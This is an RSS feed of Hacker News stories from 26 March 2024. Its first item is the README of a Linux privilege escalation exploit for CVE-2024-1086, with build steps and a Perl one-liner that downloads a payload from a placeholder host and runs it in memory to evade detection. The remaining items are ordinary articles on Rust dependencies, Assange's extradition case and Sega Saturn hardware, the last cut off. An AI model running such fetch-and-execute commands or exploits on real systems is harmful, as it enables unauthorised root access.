<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 26 Mar 2024 17:00:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Debian/Ubuntu privilege escalation PoC exploit for CVE-2024-1086 (211 pts)]]></title>
            <link>https://github.com/Notselwyn/CVE-2024-1086</link>
            <guid>39828424</guid>
            <pubDate>Tue, 26 Mar 2024 14:35:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Notselwyn/CVE-2024-1086">https://github.com/Notselwyn/CVE-2024-1086</a>, See on <a href="https://news.ycombinator.com/item?id=39828424">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">CVE-2024-1086</h2><a id="user-content-cve-2024-1086" aria-label="Permalink: CVE-2024-1086" href="#cve-2024-1086"></a></p>
<p dir="auto">Universal local privilege escalation Proof-of-Concept exploit for <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1086" rel="nofollow">CVE-2024-1086</a>, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.</p>
<details open="">
  <summary>
    
    <span aria-label="Video description exploit_poc.mp4">exploit_poc.mp4</span>
    <span></span>
  </summary>

  <video src="https://private-user-images.githubusercontent.com/68616630/316254619-a3d43951-94ab-4c09-a14b-07b81f89b3de.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0NjkxMDQsIm5iZiI6MTcxMTQ2ODgwNCwicGF0aCI6Ii82ODYxNjYzMC8zMTYyNTQ2MTktYTNkNDM5NTEtOTRhYi00YzA5LWExNGItMDdiODFmODliM2RlLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI2VDE2MDAwNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTcxOTA1ODc5N2Y4ZWM4MGVhNTYyMDZlMDJmZWFiMzdlM2RiNzVlOGVmODllMTBmYTg5ZDhlYTRiOWRiODFmNTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.4FB-UDF6i-8eY2FSN0hqc93yhvBFkPvNcaWj9Iu99IE" data-canonical-src="https://private-user-images.githubusercontent.com/68616630/316254619-a3d43951-94ab-4c09-a14b-07b81f89b3de.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE0NjkxMDQsIm5iZiI6MTcxMTQ2ODgwNCwicGF0aCI6Ii82ODYxNjYzMC8zMTYyNTQ2MTktYTNkNDM5NTEtOTRhYi00YzA5LWExNGItMDdiODFmODliM2RlLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzI2VDE2MDAwNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTcxOTA1ODc5N2Y4ZWM4MGVhNTYyMDZlMDJmZWFiMzdlM2RiNzVlOGVmODllMTBmYTg5ZDhlYTRiOWRiODFmNTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.4FB-UDF6i-8eY2FSN0hqc93yhvBFkPvNcaWj9Iu99IE" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><h2 tabindex="-1" dir="auto">Blogpost / Write-up</h2><a id="user-content-blogpost--write-up" aria-label="Permalink: Blogpost / Write-up" href="#blogpost--write-up"></a></p>
<p dir="auto">A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the <a href="https://pwning.tech/nftables/" rel="nofollow">Flipping Pages blogpost</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Affected versions</h2><a id="user-content-affected-versions" aria-label="Permalink: Affected versions" href="#affected-versions"></a></p>
<p dir="auto">The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149&gt;, v6.1.76&gt;, v6.6.15&gt;. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.</p>
<p dir="auto"><strong>Caveats:</strong></p>
<ul dir="auto">
<li>The exploit does not work v6.4&gt; kernels with kconfig <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</code> (including Ubuntu v6.5)</li>
<li>The exploits requires user namespaces (kconfig <code>CONFIG_USER_NS=y</code>), that those user namespaces are unprivileged (sh command <code>sysctl kernel.unprivileged_userns_clone</code> = 1), and that nf_tables is enabled (kconfig <code>CONFIG_NF_TABLES=y</code>). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well.</li>
<li>The exploit may be unstable on systems with a lot of network activity
<ul dir="auto">
<li>Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.</li>
<li>On test devices, please turn off WiFi adapters through BIOS.</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Configuration</h3><a id="user-content-configuration" aria-label="Permalink: Configuration" href="#configuration"></a></p>
<p dir="auto">The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in <a href="https://github.com/Notselwyn/CVE-2024-1086/blob/main/src/config.h"><code>src/config.h</code></a>. If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase <code>CONFIG_PHYS_MEM</code>.
If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle <code>CONFIG_REDIRECT_LOG</code> to <code>1</code> to avoid unnecessary network activity.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building</h3><a id="user-content-building" aria-label="Permalink: Building" href="#building"></a></p>
<p dir="auto">If this is impractical for you, there is an <a href="https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit">compiled x64 binary</a> with the default config.</p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make"><pre>git clone https://github.com/Notselwyn/CVE-2024-1086
<span>cd</span> CVE-2024-1086
make</pre></div>
<p dir="auto">Binary: <code>CVE-2024-1086/exploit</code></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Running</h3><a id="user-content-running" aria-label="Permalink: Running" href="#running"></a></p>
<p dir="auto">Running the exploit is just as trivial:</p>

<p dir="auto">Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:</p>
<div dir="auto" data-snippet-clipboard-copy-content="perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  open(my $fh, &quot;>&amp;=&quot;.$fd);
  print $fh `curl https://example.com/exploit -s`;
  exec {&quot;/proc/$$/fd/$fd&quot;} &quot;memfd&quot;;
'"><pre>perl -e <span><span>'</span></span>
<span>  require qw/syscall.ph/;</span>
<span></span>
<span>  my $fd = syscall(SYS_memfd_create(), $fn, 0);</span>
<span>  open(my $fh, "&gt;&amp;=".$fd);</span>
<span>  print $fh `curl https://example.com/exploit -s`;</span>
<span>  exec {"/proc/$$/fd/$fd"} "memfd";</span>
<span><span>'</span></span></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Disclaimer</h2><a id="user-content-disclaimer" aria-label="Permalink: Disclaimer" href="#disclaimer"></a></p>
<p dir="auto">The programs and scripts ("programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Visa, Mastercard Agree to Lower Swipe Fees, Settling Long-Running Lawsuit (117 pts)]]></title>
            <link>https://www.wsj.com/finance/banking/visa-mastercard-agree-to-lower-swipe-fees-settling-long-running-lawsuit-d6e5f0a8</link>
            <guid>39828091</guid>
            <pubDate>Tue, 26 Mar 2024 14:15:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/finance/banking/visa-mastercard-agree-to-lower-swipe-fees-settling-long-running-lawsuit-d6e5f0a8">https://www.wsj.com/finance/banking/visa-mastercard-agree-to-lower-swipe-fees-settling-long-running-lawsuit-d6e5f0a8</a>, See on <a href="https://news.ycombinator.com/item?id=39828091">Hacker News</a></p>
Couldn't get https://www.wsj.com/finance/banking/visa-mastercard-agree-to-lower-swipe-fees-settling-long-running-lawsuit-d6e5f0a8: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[VLC can't update on Android without giving Google private signing keys (102 pts)]]></title>
            <link>https://social.treehouse.systems/@Aissen/112139649840297169</link>
            <guid>39827828</guid>
            <pubDate>Tue, 26 Mar 2024 13:51:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://social.treehouse.systems/@Aissen/112139649840297169">https://social.treehouse.systems/@Aissen/112139649840297169</a>, See on <a href="https://news.ycombinator.com/item?id=39827828">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Tech Debt: My Rust Library Is Now a CDO (254 pts)]]></title>
            <link>https://lucumr.pocoo.org/2024/3/26/rust-cdo/</link>
            <guid>39827645</guid>
            <pubDate>Tue, 26 Mar 2024 13:36:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lucumr.pocoo.org/2024/3/26/rust-cdo/">https://lucumr.pocoo.org/2024/3/26/rust-cdo/</a>, See on <a href="https://news.ycombinator.com/item?id=39827645">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
  

  
  <p>written on Tuesday, March 26, 2024
  

  </p><p>You're probably familiar with tech debt.  There is a joke that if there is
tech debt, surely there must be derivatives to work with that debt?  I'm
happy to say that the Rust ecosystem has created an environment where it
looks like one solution for tech debt is collateralization.</p>
<p>Here is how this miracle works.  Say you have a library <a href="https://github.com/mitsuhiko/insta">stuff</a> which depends on some other
library <a href="https://github.com/chyh1990/yaml-rust">learned-rust-this-way</a>.
The author of <cite>learned-rust-this-way</cite> at one point lost interest in this
thing and issues keep piling up.  Some of those issues are feature
requests, others are legitimate bugs.  However you as the person that
wrote <cite>stuff</cite> never ran into any of those problems.  Yet it's hard to
argue that <cite>learned-rust-this-way</cite> isn't tech debt.  It's one that does
not bother you all that much, but it's debt nonetheless.</p>
<p>At one point someone else figures out that <cite>learned-rust-this-way</cite> is debt.
One of the ways in which this happens is because the name is great.
Clearly that's not the only person that learned Rust this way and someone
else also wants that name.  Except the original author is unreachable.  So
now there is one more reason for that package <a href="https://github.com/rustsec/advisory-db/issues/1921">to get added to the RUSTSEC
database</a> and all
the sudden all hell breaks lose.  Within minutes CI will start failing for
a lot of people that directly or indirectly use <cite>learned-rust-this-way</cite>
notifying them that something happened.  That's because <cite>RUSTSEC</cite> is
basically a rating agency and they decided that your debt is now junk.</p>
<p>What happens next?  As the maintainer of <cite>stuff</cite> your users all the sudden
start calling you out for using <cite>learned-rust-this-way</cite> and you suffer.
Stress levels increase.  You gotta unload that shit.  Why?  Not because it
does not work for you, but someone called you out of that debt.  If we
really want to stress the financial terms this is your margin call.  Your
users demand action to deal with your debt.</p>
<p>So what can you do?  One option is to move to alternatives (unload the
debt).  In this particular case for whatever reason all the alternatives
to <cite>learned-rust-this-way</cite> are not looking very appealing either.  One is
a fork of that thing which also only has a single maintained, but all the
sudden pulls in 3 more dependencies, one of which already have a "B-"
rating.  Another option in the ecosystem just decided <a href="https://github.com/dtolnay/serde-yaml/commit/3ba8462f7d3b603d832e0daeb6cfc7168a673d7a">to default</a>
before they are called out.</p>
<p>Remember you never touched <cite>learned-rust-this-way</cite> actively.  It worked
for you in the unmaintained way of the last four years.  If you now fork
that library (and name it <cite>learned-rust-this-way-and-its-okay</cite>) you are
now subject to the same demands.  Forking that library is putting cash on
the pile of debt.  Except if you don't act up on the bug reports there,
you will eventually be called out like <cite>learned-rust-this-way</cite> was.  So
while that might buy you time, it does not really solve the issue.</p>
<p>However here is what actually does work: you just merge that code into
your own library.  Now that junk tech debt is suddenly rated “AAA”.  For
as long as you never touch that code any more, you never reveal to anyone
that you did that, and you just keep maintaining your library like you did
before, the world keeps spinning on.</p>
<p>So as of today: I collateralized <cite>yaml-rust</cite> by vendoring it in <cite>insta</cite>.
It's now an amalgamation of insta code and yaml-rust.  And by doing so, I
successfully upgraded this junk tech debt to a perfect AAA.</p>
<p>Who won?  I think nobody really.</p>


  
  <p>This entry was tagged
    
      <a href="https://lucumr.pocoo.org/tags/rust/">rust</a> and 
      <a href="https://lucumr.pocoo.org/tags/thoughts/">thoughts</a>
  

      </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Julian Assange granted permission to appeal against extradition to US (169 pts)]]></title>
            <link>https://www.theguardian.com/media/2024/mar/26/julian-assange-granted-permission-to-appeal-against-extradition-to-us</link>
            <guid>39826176</guid>
            <pubDate>Tue, 26 Mar 2024 10:37:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/media/2024/mar/26/julian-assange-granted-permission-to-appeal-against-extradition-to-us">https://www.theguardian.com/media/2024/mar/26/julian-assange-granted-permission-to-appeal-against-extradition-to-us</a>, See on <a href="https://news.ycombinator.com/item?id=39826176">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>Julian Assange has been handed a reprieve in his fight against extradition to the US after two judges ruled the WikiLeaks founder could take his case to an appeal hearing – but only if the Biden administration is unable to provide the court with suitable assurances.</p><p>The president of the king’s bench division, Victoria Sharp, and Mr Justice Johnson said Assange had real prospects of success on three of the nine grounds argued, but adjourned the leave to appeal application to give the US government three weeks to provide reassurance on the relevant matters.</p><p>If Assange had been denied permission to appeal he could have been extradited within days to face espionage charges. While the judges’ decision means he avoids that fate it leaves him facing a further wait, with his future still unresolved.</p><p>In <a href="https://www.judiciary.uk/judgments/assange-v-government-of-the-united-states-of-america-3/" data-link-name="in body link">a written judgment</a>, handed down on Tuesday morning, Sharp said the concerns that had real prospects of success at appeal but which “may be capable of being addressed by assurances” were “that the applicant [Assange] is permitted to rely on the first amendment, that the applicant is not prejudiced at trial, including sentence, by reason of his nationality, that he is afforded the same first amendment protections as a United States citizen, and that the death penalty is not imposed”.</p><p>At a two-day hearing last month, which Assange was too unwell to attend, <a href="https://www.theguardian.com/media/2024/feb/20/julian-assange-risks-flagrant-denial-of-justice-if-tried-in-us-london-court-told" data-link-name="in body link">his lawyers argued</a> that he faced a “flagrant denial of justice” if extradited to the US to face charges relating to the publication by Assange and WikiLeaks of thousands of classified and diplomatic documents they said had exposed torture, rendition, extrajudicial killings and war crimes.</p><p>His wife, Stella Assange, expressed dismay at the judges’ decision. “What the courts have done has been to invite a political intervention from the United States … send a letter saying ‘its all OK’,” she said. “I find this astounding.</p><p>“This case is a retribution. It is a signal to all of you that if you expose the interests that are driving war they will come after you, they will put you in prison and will try to kill you.</p><p>“The Biden administration should not issue assurances. They should drop this shameful case that should never have been brought.”</p><p>Ahead of the decision there had been <a href="https://www.theguardian.com/media/2024/mar/20/julian-assange-wikileaks-plea-deal" data-link-name="in body link">reports that the US government was considering a plea deal offer</a> to Assange, allowing him to admit to a misdemeanour, which would enable him to walk free from prison in the UK but his lawyers said they had been “given no indication” Washington intended to change its approach.</p><p>Sharp stated in Tuesday’s 66-page judgment that the UK home secretary’s lawyer had accepted that there was nothing in place to prevent Assange being charged in the US with an offence that carried the death penalty and it then being imposed.</p><p>She cited as evidence of such a risk “the calls for the imposition of the death penalty by leading politicians and other public figures; the fact that the [UK-US extradition] treaty does not preclude extradition for death penalty charges, and the fact that the existing assurance does not explicitly cover the death penalty”.</p><p>On free speech protections under the first amendment in the US, Sharp said: “He [Assange] contends that if he is given first amendment rights, the prosecution will be stopped. The first amendment is therefore of central importance to his defence to the extradition charge. Further, if he is convicted, he may wish to invoke the first amendment on the question of sentence. If he is not permitted to rely on the first amendment because of his status as a foreign national, he will thereby be prejudiced – potentially very greatly prejudiced – by reason of his nationality.”</p><p>The US has been given until 16 April to file its assurances. If it does not do so, leave to appeal will be granted. If it does provide assurances by that date the parties will be invited to file further written submissions on the issue of leave to appeal with another hearing provisionally listed for 20 May.</p><p>Michelle Stanistreet, the general secretary of the National Union of Journalists, welcomed the “temporary reprieve” but called on the US to pursue a plea deal.</p><p>“The conditionality around the grounds of appeal, which are contingent on the examination of US government assurances that he will not face the death penalty and has the right to free speech, mean the risks to Assange and press freedom remain stark,” she said.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sega Saturn Architecture – A practical analysis (183 pts)]]></title>
            <link>https://www.copetti.org/writings/consoles/sega-saturn/</link>
            <guid>39825901</guid>
            <pubDate>Tue, 26 Mar 2024 09:51:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.copetti.org/writings/consoles/sega-saturn/">https://www.copetti.org/writings/consoles/sega-saturn/</a>, See on <a href="https://news.ycombinator.com/item?id=39825901">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><h2 id="imagery">Supporting imagery</h2><section><ul><li><a href="#cover-model">Model</a></li><li><a href="#cover-motherboard">Motherboard</a></li><li><a href="#cover-diagram">Diagram</a></li></ul></section><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>Welcome to the 3D era! Well… <em>sorta</em>. Sega enjoyed quite a success with the Mega Drive so there’s no reason to force developers to write 3D games <em>right now</em>.</p><p>Just in case developers want the extra dimension, Sega adapted some bits of the hardware to enable polygon drawing as well. Hopefully, the result didn’t get out of hand!</p><hr><h2 id="cpu">CPU</h2><p>Just like its close competitors <a href="https://www.copetti.org/writings/consoles/playstation/#a-bit-of-history">drowned with options</a> during the RISC fever, Sega had to go through all the conundrums of choosing a new vendor that could bring up the next generation of games (including those with ‘3D’ capabilities). In the end, the company chose a fresh CPU whose creator was desperately looking for an adopter, the <strong>Hitachi SuperH</strong> or ‘SH’.</p><p>While initially focused on embedded applications, Hitachi’s new creation debuted modern arts such as <sup id="bibref:1"><a href="#bib:cpu-prog_manual" role="doc-biblioref">[1]</a></sup>:</p><ul><li>A <a href="https://www.copetti.org/writings/consoles/xbox/#tab-1-4-cisc-or-risc">load-store architecture</a>, meaning instructions don’t mix memory and register operations, resulting in a cleaner and scalable CPU design. This is one of the pillars of RISC CPUs.</li><li><strong>32-bit data bus and ALU</strong>, enabling to move and operate larger amounts of data (32-bit values) without consuming extra cycles.</li><li><strong>16 general-purpose 32-bit registers</strong>, which is double the amount of previous CPUs like the <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#cpu">Motorolla 68000</a>. This is another design decision derived from the RISC guidelines <sup id="bibref:2"><a href="#bib:cpu-patterson" role="doc-biblioref">[2]</a></sup>.</li><li><strong>32-bit address bus</strong>, allowing up to 4 GB of memory to be addressed (<em>farewell <a href="https://www.copetti.org/writings/consoles/nes/#going-beyond-existing-capabilities">mappers</a></em>).</li><li>A <strong>pipelined data path</strong> with <strong>five stages</strong>: The execution of instructions is now divided into five steps or <em>stages</em>. The CPU will queue up to five instructions and each one is allocated in one stage. This allows taking advantage of all the CPU’s resources without idling while also incrementing the number of instructions executed per unit of time.</li><li>A <strong>16-bit multiplication unit</strong>: Performs multiplications with 16-bit integers.</li></ul><p>Furthermore, the SuperH features a new instruction set called <strong>SuperH ISA</strong> which, apart from adopting a RISC design, <strong>all of its instructions are 16-bit wide</strong>. This comes as a surprise since this CPU operates 32-bit words, so you would expect instructions to have the same length. Yet, Hitachi managed to fit its ISA using half the size. Not only does this format reduce the size of programs, but since the CPU fetches instructions in 32-bit batches, <strong>two instructions can be retrieved in one cycle</strong>. Overall, this technique of compressing the instruction set helped tackle a common concern of RISC-based architectures called ‘code density’, where the latter required more instructions (therefore, more memory) to perform the same tasks as non-RISC systems.</p><p>Conversely, other drawbacks of RISC designs are still present in the SuperH, such as <a href="https://www.copetti.org/writings/consoles/playstation/#delay-galore">control hazards</a>. Consequently, programs are required to include <strong>branch delay slots</strong> to avoid calculation errors. To remediate things, the SuperH features <strong>delayed branch instructions</strong> which are branch instructions pre-fitted with a delay slot.</p><h3 id="sega-is-not-satisfied">Sega is not satisfied</h3><p>Nevertheless, all of that didn’t stop Sega from expressing dissatisfaction with the end product. This was mainly due to the small 16-bit multiplier, which was seen as a bottleneck when processing larger amounts of data (a new need for 3D games). Thus, Hitachi synthesised a second revision with an extended multiplier unit and other requirements on Sega’s checklist <sup id="bibref:3"><a href="#bib:cpu-history" role="doc-biblioref">[3]</a></sup>, leading to a new CPU called <strong>SH-2</strong>.</p><figure><a href="https://www.copetti.org/images/consoles/saturn/sh2s.93e7ad76052cc0ac65d530f751c4fede4665f17d15fa22ff6d6586679b058506.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/_huba88a0028b93a412d89cfad4789263a2_175147_addfe0a24317362c6332a2050138e558.webp 500w,
https://www.copetti.org/images/consoles/saturn/_huba88a0028b93a412d89cfad4789263a2_175147_2ff4e5397b9a9daa87d63b89d955091f.webp 800w,
https://www.copetti.org/images/consoles/saturn/_huba88a0028b93a412d89cfad4789263a2_175147_ab4a3695756c252f48271e585bb99235.webp 900w"><img alt="Image" width="900" height="509" src="https://www.copetti.org/images/consoles/saturn/sh2s.93e7ad76052cc0ac65d530f751c4fede4665f17d15fa22ff6d6586679b058506.jpg" loading="lazy"></picture></a><figcaption>The two SH-2 chips found in the Sega Saturn</figcaption></figure><p>Even so, Sega couldn’t stand still after hearing what choice of CPU <a href="https://www.copetti.org/writings/consoles/playstation/#cpu">its</a> <a href="https://www.copetti.org/writings/consoles/nintendo-64/#cpu">competitors</a> went for. So, it asked Hitachi to step up the clock frequency of the SH-2 - an impossible task once the chip is already out for manufacturing. Luckily, Hitachi had another trick up in their sleeve: <strong>multiprocessing</strong>. During the research phase of the SH, the team added minimal circuitry to allow the SH to work with other SHs within the same system at the same time. Upon hearing that, Sega decided on a two-chip configuration for the Sega Saturn. And the rest is history.</p><h3 id="the-final-product">The final product</h3><p>Having explained the origins, let’s take a look at the shipped product.</p><p>This console has not one but <strong>two Hitachi SH-2</strong> CPUs running at <strong>~28.63 MHz each</strong> <sup id="bibref:4"><a href="#bib:cpu-overview" role="doc-biblioref">[4]</a></sup>. While both physically identical, they are placed in a <strong>master-slave state</strong>, where the first one may send commands to the second one. This can achieve some degree of parallelism, albeit both sharing the same external bus <sup id="bibref:5"><a href="#bib:cpu-dualcpu" role="doc-biblioref">[5]</a></sup> (which can lead to congestion).</p><p>Hitachi packaged different variants of the SH-2 and sold them as part of a series called ‘SH7600’. All of them feature <sup id="bibref:6"><a href="#bib:cpu-brief" role="doc-biblioref">[6]</a></sup>:</p><ul><li>The aforementioned <strong>five-stage pipeline</strong> and <strong>SuperH ISA</strong>. The latter has been extended with six additional instructions for specialised branching and arithmetic.</li><li>An upgraded <strong>32-bit multiplication unit</strong>, which now performs multiplication with 32-bit integers.</li><li>A <strong>32-bit external data bus</strong> that is shared across the two CPUs.</li></ul><p>The specific chip selected for this console, the ‘SH7604’, contains the following additions <sup id="bibref:7"><a href="#bib:cpu-prog_manual" role="doc-biblioref">[7]</a></sup>:</p><ul><li><strong>4 KB of cache</strong>: Stores a small number of instructions and data previously fetched from memory to speed up future reads.</li><li>A <strong>32-bit division unit</strong>: Performs division with 32-bit integers.</li><li><strong>Internal DMA controller</strong>: Transfers data from memory without the intervention of the CPU.</li><li>Support for <strong>little endian</strong>, enabling the CPU to understand values encoded in the opposite order. This is useful when external memory is shared with other processors.</li></ul><p>It’s worth pointing out that <strong>having two CPUs doesn’t mean that games will work twice as fast!</strong> In practice, however, this requires very complex programming to efficiently manage CPUs that share the same bus. Thus, efficient use of the cache also plays a critical role in this console.</p><h3 id="a-divided-choice-of-memory">A divided choice of memory</h3><p>The Sega Saturn contains a total of <strong>2 MB of RAM</strong> for general-purpose usage called <strong>Work RAM</strong> (WRAM). Now, these two megs are split between two very different blocks:</p><ul><li>The first one provides <strong>1 MB of SDRAM</strong> and due to its fast access rates, this block is also called ‘WRAM-H’.</li><li>The other block contains the other megabyte, but it’s named ‘WRAM-L’ since it uses <strong>DRAM</strong> instead, resulting in lower rates.</li></ul><h3 id="the-third-processor-and-counting">The third processor (and counting)</h3><p>Surprisingly, it seems that the two SH-2 CPUs weren’t still enough for Sega. So, to accelerate vector processing (at the cost of more complexity), the console houses an additional coprocessor, the <strong>Saturn Control Unit</strong> or ‘SCU’.</p><p>This is a chip comprised of two modules <sup id="bibref:8"><a href="#bib:cpu-scu" role="doc-biblioref">[8]</a></sup>:</p><ul><li><strong>A DMA controller</strong>: Arbitrates access to WRAM across the three main buses without the intervention of the CPUs.</li><li><strong>A DSP</strong>: Used as a fixed-point ‘geometry unit’. Compared to the SH-2, it does matrix/vectors calculations such as 3D transformations and lighting faster. However, it runs at half-speed and its instruction set is more complex. Moreover, it relies on the SH-2’s WRAM to fetch and store data (using the DMA).</li></ul><p>On the bright side, the SCU comes with <strong>32 KB of SRAM</strong> for local use. On the bad side, the SCU can’t access WRAM-L.</p><hr><h2 id="graphics">Graphics</h2><p>Since the Saturn is the first ‘3D console’ reviewed for <a href="https://www.copetti.org/writings/consoles/">this series</a>, let us first go over the fundamental design changes that made way to the new generation of 3D graphics:</p><ul><li>The GPU now relies on a <strong>frame-buffer</strong>: Graphics are no longer required to be rendered on-the-fly. Instead, the GPU reserves a portion of VRAM to draw a bitmap with all the computed geometry requested by the CPU, and then a video encoder picks up that region and outputs it through the video signal.<ul><li>Consequently, having this reserved ‘working space’ allows the GPU to continue manipulating the bitmap even after finishing rendering the scene, so the CPU may now offload some exhaustive tasks such as lighting and anti-aliasing to the GPU. Here is when the term <strong>graphics pipeline</strong> starts to gain momentum.</li></ul></li><li><strong>More VRAM required</strong>: The use of a frame buffer implies an increment of memory requirements (which is not a big issue anymore), the amount of RAM required for a frame buffer is proportional to the dimension of the screen and the number of colours used. As an example, with 600 KB of VRAM we can contain a frame buffer of 640x480 pixels wide with 32k colours per pixel (16 bpp).<ul><li>Additionally, programmers are free to organise their VRAM usage: Not every single bit has to be allocated for the frame buffer, so why don’t we also use it to cache textures, render other frame-buffers concurrently and add colour lookup tables to speed things up?</li></ul></li><li>The CPU incorporates <strong>vector operations</strong>: A GPU with 3D capabilities would be incomplete without a proper CPU capable of feeding the required geometry. For that reason, next-gen CPUs include a form of specialised instructions that accelerates vector calculations, these are known as <strong>Single instruction multiple data</strong> or ‘SIMD’ extension.<ul><li>In the case of the Saturn, vector operations are accelerated by the Saturn Control Unit (not by the SH-2 CPUs).</li></ul></li></ul><h3 id="segas-offering">Sega’s offering</h3><p>This console includes <strong>two proprietary GPUs</strong>, each one serving different purposes while working concurrently. Some may argue that the new GPUs are an evolution of the <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#graphics">classic VDP</a>, while others may say it’s a complete redesign… I think it’s a bit of both.</p><p>Having said that, let’s take a look at the two chips.</p><div><ul><li id="tab-1-1-vdp1-link"><a href="#tab-1-1-vdp1">VDP1</a></li><li id="tab-1-2-vdp2-link"><a href="#tab-1-2-vdp2">VDP2</a></li></ul><div><div id="tab-1-1-vdp1"><h4 id="tab-1-1-vdp1">VDP1</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/vdp/VDP1.fdad1a669a57458ce0a25a18bc77b259452f485cecbc146ad56eff227d371352.png"><picture><img alt="Image" width="570" height="411" src="https://www.copetti.org/images/consoles/saturn/vdp/VDP1.fdad1a669a57458ce0a25a18bc77b259452f485cecbc146ad56eff227d371352.png" loading="lazy"></picture></a><figcaption>VDP1 Architecture.</figcaption></figure><p>The <strong>Video Display Processor 1</strong> (VDP1) is a chip that draws sprites with geometric transformations <sup id="bibref:9"><a href="#bib:graphics-vdp1" role="doc-biblioref">[9]</a></sup>. The results are written onto a frame buffer, which is in turn streamed to the VDP2 for display.</p><p>This chip is programmed by sending ‘drawing commands’ to it. So, programmers are provided with <strong>512 KB of dedicated RAM</strong> to store these drawing commands and the required materials (textures/tiles, colour lookup tables, etc).</p><p>Consequently, the VDP1 is designed to use <strong>quadrilaterals as primitives</strong>, which means that it can only compose models using 4-vertex polygons (sprites). The chip applies <strong>Forward Texture Mapping</strong> to connect texture points onto the quadrilateral, in that direction. It doesn’t come with any filtering/interpolation technique, so the calculations are subject to <strong>aliasing</strong>.</p><p>The VDP1 also provides this 